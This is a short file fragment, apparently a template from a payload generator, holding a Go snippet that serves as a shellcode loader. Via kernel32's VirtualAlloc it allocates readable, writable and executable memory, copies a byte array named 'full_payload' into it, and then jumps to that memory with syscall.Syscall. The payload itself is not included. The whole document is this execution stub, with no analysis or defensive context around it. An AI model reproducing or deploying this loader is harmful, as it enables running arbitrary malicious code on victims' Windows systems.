imports=["syscall"]

loader="""
    const (
        memCommit = 0x1000
        memReserve = 0x2000
        pageExecRW = 0x40
    )

    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    procVirtualAlloc := kernel32.NewProc("VirtualAlloc")
    
    fmt.Println("len full_payload", len(full_payload))
    addr, _, err := procVirtualAlloc.Call(0, uintptr(len(full_payload)), memReserve|memCommit, pageExecRW)
    
    if addr == 0 {
        fmt.Println(err)
        os.Exit(1)
    }

    buff := (*[890000]byte)(unsafe.Pointer(addr))

    for x, value := range full_payload {
        buff[x] = value
    }

    fmt.Println(len(buff))

    syscall.Syscall(addr, 0, 0, 0, 0)
    
"""